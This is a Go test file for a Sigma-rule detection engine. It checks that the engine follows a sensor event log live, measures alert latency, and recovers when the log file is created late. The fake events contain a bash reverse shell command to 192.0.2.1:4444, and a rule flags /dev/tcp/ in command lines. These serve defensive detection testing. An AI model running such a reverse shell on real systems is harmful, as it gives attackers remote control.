package engine

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/parser"
	"github.com/conor-sometimes/banken/internal/sigma"
)

// syncSink is a dispatch sink safe to read from the test while StreamFollow's goroutine writes.
type syncSink struct {
	mu    sync.Mutex
	count int
}

func (s *syncSink) Name() string           { return "sync" }
func (s *syncSink) Emit(alert.Alert) error { s.mu.Lock(); s.count++; s.mu.Unlock(); return nil }
func (s *syncSink) Close() error           { return nil }
func (s *syncSink) n() int                 { s.mu.Lock(); defer s.mu.Unlock(); return s.count }

// TestStreamFollowIsContinuousAndMeasuresLatency proves banken consumes a sensor stream as a
// continuous push: a line appended to the followed file is processed and alerted without any scan
// interval elapsing, and the capture-to-match latency is a measured number (not "should be fast").
func TestStreamFollowIsContinuousAndMeasuresLatency(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "events.jsonl")
	statePath := filepath.Join(dir, "cursor.json")
	if err := os.WriteFile(path, nil, 0o600); err != nil {
		t.Fatal(err)
	}

	r := testRule(t, `title: reverse shell
detection:
  sel:
    CommandLine|contains: /dev/tcp/
  condition: sel`)
	sink := &syncSink{}
	eng := New([]*sigma.Rule{r}, nil, alert.NewDispatcher(sink))

	var mu sync.Mutex
	var lastLat time.Duration
	var latCount, alertSum int
	onLat := func(_ event.Event, lat time.Duration, alerts int) {
		mu.Lock()
		lastLat, latCount, alertSum = lat, latCount+1, alertSum+alerts
		mu.Unlock()
	}

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, onLat, nil) }()

	writeLine := func(cmd string) {
		line := `{"schema":"mimi/2","time":"` + time.Now().UTC().Format(time.RFC3339Nano) +
			`","process":{"pid":42,"name":"bash","cmd_line":"` + cmd +
			`","file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},` +
			`"ancestry":[{"pid":42,"name":"bash"}]}` + "\n"
		f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o600)
		if err != nil {
			t.Error(err)
			return
		}
		_, werr := f.WriteString(line)
		_ = f.Close()
		if werr != nil {
			t.Error(werr)
		}
	}

	// A benign exec (no alert) then the reverse shell: both must be processed promptly, live.
	writeLine("bash -c true")
	writeLine("bash -i >& /dev/tcp/192.0.2.1/4444")

	deadline := time.Now().Add(3 * time.Second)
	for sink.n() < 1 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}

	if sink.n() != 1 {
		t.Fatalf("dispatched %d alerts, want 1 (only the reverse shell)", sink.n())
	}
	mu.Lock()
	defer mu.Unlock()
	if alertSum != 1 {
		t.Fatalf("onLatency reported %d alerts, want 1", alertSum)
	}
	if latCount < 2 {
		t.Fatalf("onLatency called %d times, want >=2 (both events carried a capture time)", latCount)
	}
	if lastLat <= 0 || lastLat > 30*time.Second {
		t.Fatalf("latency %v implausible (want a small positive capture-to-match duration)", lastLat)
	}
}

// TestStreamFollowSelfHealsWhenSinkAppearsAfterArming is the deployed failure in a unit: banken
// began following before the sensor had ever created its sink -- the directory and file are both
// absent when the follow is armed, so neither inotify watch (file, or parent-dir) can be set. Only
// the safety-net re-drain can then pick the stream up once the sensor finally writes it. Without
// that floor the follow blocks forever and no alert fires.
func TestStreamFollowSelfHealsWhenSinkAppearsAfterArming(t *testing.T) {
	root := t.TempDir()
	sub := filepath.Join(root, "private", "mimi") // absent at arm time, like a not-yet-created LogsDirectory
	path := filepath.Join(sub, "events.jsonl")
	statePath := filepath.Join(root, "cursor.json")

	r := testRule(t, `title: reverse shell
detection:
  sel:
    CommandLine|contains: /dev/tcp/
  condition: sel`)
	sink := &syncSink{}
	eng := New([]*sigma.Rule{r}, nil, alert.NewDispatcher(sink))

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	done := make(chan error, 1)
	go func() { done <- eng.StreamFollow(ctx, parser.Mimi{}, path, statePath, nil, nil) }()

	time.Sleep(200 * time.Millisecond) // let it arm and fail to watch anything
	if err := os.MkdirAll(sub, 0o700); err != nil {
		t.Fatal(err)
	}
	line := `{"schema":"mimi/2","time":"` + time.Now().UTC().Format(time.RFC3339Nano) +
		`","process":{"pid":42,"name":"bash","cmd_line":"bash -i >& /dev/tcp/192.0.2.1/4444",` +
		`"file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},"ancestry":[{"pid":42,"name":"bash"}]}` + "\n"
	if err := os.WriteFile(path, []byte(line), 0o600); err != nil {
		t.Fatal(err)
	}

	deadline := time.Now().Add(4 * time.Second)
	for sink.n() < 1 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	cancel()
	if err := <-done; err != nil && !errors.Is(err, context.Canceled) {
		t.Fatalf("StreamFollow returned %v", err)
	}
	if sink.n() != 1 {
		t.Fatalf("dispatched %d alerts, want 1 -- banken did not pick up a sink created after arming (safety-net re-drain missing?)", sink.n())
	}
}
